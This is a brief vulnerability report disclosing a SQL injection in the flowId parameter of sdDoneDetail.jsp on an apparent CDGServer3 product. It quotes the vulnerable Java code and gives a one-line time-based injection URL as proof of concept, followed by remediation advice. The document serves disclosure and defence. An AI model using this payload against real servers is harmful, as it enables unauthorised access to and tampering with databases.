![image-20250116160456332](./assets/image-20250116160456332.png)



# Vulnerability Report

## Vulnerability Type

SQL Injection

## Vulnerability Description

The `flowId` parameter in the `sdDoneDetail.jsp` interface is not properly validated and sanitized, leading to a SQL injection vulnerability. An attacker can craft a malicious `flowId` parameter to execute arbitrary SQL queries, potentially accessing or modifying sensitive information in the database.

## Vulnerable Code

```java
String flowId = request.getParameter("flowId");
………………
FlowDao dao = new FlowDao();
Flow flow = dao.getAppById(flowId);
```

## POC

An attacker can test the vulnerability using the following POC:

```
https://uri/CDGServer3/sdDoneDetail.jsp?flowId=1';WAITFOR DELAY '0:0:10'--
```

## Impact Scope

This vulnerability may affect all functionalities that use the `sdDoneDetail.jsp` interface and allow user submission of the `flowId` parameter.

## Remediation Suggestions

1. Strictly validate and sanitize the user input for the `flowId` parameter to ensure it contains only legitimate values.
2. Use prepared statements to execute database queries to prevent SQL injection attacks.
3. Conduct regular security audits and code reviews to identify and remediate potential security vulnerabilities.
